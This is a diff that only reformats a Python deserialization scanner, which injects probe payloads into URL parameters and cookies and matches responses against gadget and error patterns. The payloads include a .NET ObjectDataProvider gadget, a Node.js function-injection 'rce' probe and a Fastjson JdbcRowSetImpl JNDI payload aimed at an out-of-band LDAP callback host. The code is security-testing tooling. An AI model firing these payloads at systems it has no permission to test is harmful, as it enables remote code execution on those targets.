@@ -19,7 +19,6 @@ Features:
      • OOB interaction confirmation.
 """
 
-
 from __future__ import annotations
 
 import asyncio
@@ -65,16 +64,10 @@ _DOTNET_DESER_PROBES: tuple[str, ...] = (
     '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"}',
 )
 
-_NODEJS_DESER_PROBES: tuple[str, ...] = (
-    '{"rce":"_$$ND_FUNC$$_function(){return 1;}()"}',
-)
+_NODEJS_DESER_PROBES: tuple[str, ...] = ('{"rce":"_$$ND_FUNC$$_function(){return 1;}()"}',)
 
 _ALL_ACTIVE_PROBES = (
-    _JAVA_DESER_PROBES
-    + _PHP_DESER_PROBES
-    + _PYTHON_DESER_PROBES
-    + _DOTNET_DESER_PROBES
-    + _NODEJS_DESER_PROBES
+    _JAVA_DESER_PROBES + _PHP_DESER_PROBES + _PYTHON_DESER_PROBES + _DOTNET_DESER_PROBES + _NODEJS_DESER_PROBES
 )
 
 _DESER_ERROR_MARKERS: tuple[str, ...] = (
@@ -100,22 +93,22 @@ class DeserDetector:
 
     # Gadget and indicator patterns in baseline or error responses
     GADGET_PATTERNS = [
-        (r'java\.io\.', "java_io_deserialization", Severity.CRITICAL, 0.85),
-        (r'javax\.naming\.', "jndi_injection_indicator", Severity.CRITICAL, 0.85),
-        (r'com\.sun\.rowset\.', "java_rowset_deserialization", Severity.CRITICAL, 0.85),
-        (r'org\.apache\.commons\.collections\.', "commons_collections_deserialization", Severity.CRITICAL, 0.85),
-        (r'javassist', "java_bytecode_manipulation", Severity.HIGH, 0.80),
-        (r'org\.springframework', "spring_deserialization", Severity.HIGH, 0.80),
-        (r' unserialize\(', "php_unserialize_usage", Severity.HIGH, 0.80),
-        (r'__wakeup', "php_magic_method", Severity.HIGH, 0.75),
-        (r'__destruct', "php_destructor", Severity.HIGH, 0.75),
-        (r'pickle\.loads', "python_pickle_deserialization", Severity.CRITICAL, 0.85),
-        (r'__reduce__', "python_pickle_reduction", Severity.HIGH, 0.80),
-        (r'yaml\.load', "unsafe_yaml_deserialization", Severity.HIGH, 0.80),
-        (r'BinaryFormatter', "binaryformatter_deserialization", Severity.CRITICAL, 0.85),
-        (r'NetDataContractSerializer', "netdatacontractserializer", Severity.HIGH, 0.80),
-        (r'LosFormatter', "losformatter_deserialization", Severity.HIGH, 0.80),
-        (r'ObjectStateFormatter', "objectstateformatter", Severity.HIGH, 0.80),
+        (r"java\.io\.", "java_io_deserialization", Severity.CRITICAL, 0.85),
+        (r"javax\.naming\.", "jndi_injection_indicator", Severity.CRITICAL, 0.85),
+        (r"com\.sun\.rowset\.", "java_rowset_deserialization", Severity.CRITICAL, 0.85),
+        (r"org\.apache\.commons\.collections\.", "commons_collections_deserialization", Severity.CRITICAL, 0.85),
+        (r"javassist", "java_bytecode_manipulation", Severity.HIGH, 0.80),
+        (r"org\.springframework", "spring_deserialization", Severity.HIGH, 0.80),
+        (r" unserialize\(", "php_unserialize_usage", Severity.HIGH, 0.80),
+        (r"__wakeup", "php_magic_method", Severity.HIGH, 0.75),
+        (r"__destruct", "php_destructor", Severity.HIGH, 0.75),
+        (r"pickle\.loads", "python_pickle_deserialization", Severity.CRITICAL, 0.85),
+        (r"__reduce__", "python_pickle_reduction", Severity.HIGH, 0.80),
+        (r"yaml\.load", "unsafe_yaml_deserialization", Severity.HIGH, 0.80),
+        (r"BinaryFormatter", "binaryformatter_deserialization", Severity.CRITICAL, 0.85),
+        (r"NetDataContractSerializer", "netdatacontractserializer", Severity.HIGH, 0.80),
+        (r"LosFormatter", "losformatter_deserialization", Severity.HIGH, 0.80),
+        (r"ObjectStateFormatter", "objectstateformatter", Severity.HIGH, 0.80),
     ]
 
     def __init__(self, payload_smith, fingerprint: dict[str, Any]):
@@ -140,13 +133,9 @@ class DeserDetector:
         # 1. Baseline Request
         try:
             if method.upper() == "GET":
-                baseline_resp = await context.request.get(
-                    url, params=params, headers={"Referer": target}, timeout=3000
-                )
+                baseline_resp = await context.request.get(url, params=params, headers={"Referer": target}, timeout=3000)
             else:
-                baseline_resp = await context.request.post(
-                    url, data=params, headers={"Referer": target}, timeout=3000
-                )
+                baseline_resp = await context.request.post(url, data=params, headers={"Referer": target}, timeout=3000)
             baseline_body = await baseline_resp.text()
             baseline_status = baseline_resp.status
         except Exception:
@@ -161,9 +150,7 @@ class DeserDetector:
 
         # ── Engine 2: Active Param-level Deserialization Probes ─────────
         for param_name in list(params.keys()):
-            f = await self._test_param(
-                context, target, method, url, param_name, params, baseline_body, baseline_status
-            )
+            f = await self._test_param(context, target, method, url, param_name, params, baseline_body, baseline_status)
             if f:
                 findings.append(f)
 
@@ -210,27 +197,29 @@ class DeserDetector:
         for pattern, indicator_slug, severity, confidence in self.GADGET_PATTERNS:
             if re.search(pattern, body_lower):
                 title = indicator_slug.replace("_", " ").title()
-                findings.append(Finding(
-                    target=target,
-                    url=str(getattr(resp, "url", None) or url),
-                    method=method.upper(),
-                    param=param_name,
-                    location="query" if method.upper() == "GET" else "body",
-                    payload=f"Deserialization indicator: {title}",
-                    attack_type=AttackType.DESERIALIZATION,
-                    severity=severity,
-                    verified=True,
-                    confidence=confidence,
-                    status=status,
-                    headers=dict(resp.headers) if hasattr(resp, "headers") else {},
-                    body=body[:2000],
-                    diffs=[f"deser:content:{indicator_slug}"],
-                    baseline_body=body[:2000],
-                    baseline_status=status,
-                    verification_body=body[:2000],
-                    verification_status=status,
-                    metadata={"signature": indicator_slug},
-                ))
+                findings.append(
+                    Finding(
+                        target=target,
+                        url=str(getattr(resp, "url", None) or url),
+                        method=method.upper(),
+                        param=param_name,
+                        location="query" if method.upper() == "GET" else "body",
+                        payload=f"Deserialization indicator: {title}",
+                        attack_type=AttackType.DESERIALIZATION,
+                        severity=severity,
+                        verified=True,
+                        confidence=confidence,
+                        status=status,
+                        headers=dict(resp.headers) if hasattr(resp, "headers") else {},
+                        body=body[:2000],
+                        diffs=[f"deser:content:{indicator_slug}"],
+                        baseline_body=body[:2000],
+                        baseline_status=status,
+                        verification_body=body[:2000],
+                        verification_status=status,
+                        metadata={"signature": indicator_slug},
+                    )
+                )
                 break
 
         return findings
@@ -255,20 +244,22 @@ class DeserDetector:
                 test_params = dict(all_params)
                 test_params[param_name] = payload
                 if method.upper() == "GET":
-                    resp = await context.request.get(
-                        url, params=test_params, headers={"Referer": target}, timeout=3000
-                    )
+                    resp = await context.request.get(url, params=test_params, headers={"Referer": target}, timeout=3000)
                 else:
-                    resp = await context.request.post(
-                        url, data=test_params, headers={"Referer": target}, timeout=3000
-                    )
+                    resp = await context.request.post(url, data=test_params, headers={"Referer": target}, timeout=3000)
                 body = await resp.text()
 
                 f = self._evaluate_response(
-                    baseline_body, baseline_status, body, resp,
-                    target, url, method, param_name,
+                    baseline_body,
+                    baseline_status,
+                    body,
+                    resp,
+                    target,
+                    url,
+                    method,
+                    param_name,
                     "query" if method.upper() == "GET" else "body",
-                    payload
+                    payload,
                 )
                 if f:
                     return f
@@ -306,8 +297,7 @@ class DeserDetector:
                     body = await resp.text()
 
                     f = self._evaluate_response(
-                        baseline_body, baseline_status, body, resp,
-                        target, url, method, c_name, "cookie", payload
+                        baseline_body, baseline_status, body, resp, target, url, method, c_name, "cookie", payload
                     )
                     if f:
                         findings.append(f)
@@ -336,9 +326,7 @@ class DeserDetector:
             oob_domain = self.interactsh.generate_oob_url("deser")
             await self.interactsh.register()
 
-            fastjson_payload = (
-                f'{{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{oob_domain}/x","autoCommit":true}}'
-            )
+            fastjson_payload = f'{{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{oob_domain}/x","autoCommit":true}}'
             param_name = list(params.keys())[0] if params else "data"
             test_params = dict(params)
             test_params[param_name] = fastjson_payload
@@ -399,10 +387,7 @@ class DeserDetector:
         baseline_lower = baseline_body.lower()
 
         # Check for unpickling / deserialization error triggers
-        triggered_errors = [
-            m for m in _DESER_ERROR_MARKERS
-            if m in body_lower and m not in baseline_lower
-        ]
+        triggered_errors = [m for m in _DESER_ERROR_MARKERS if m in body_lower and m not in baseline_lower]
 
         if triggered_errors:
             diffs.extend([f"deser:error:{m}" for m in triggered_errors])
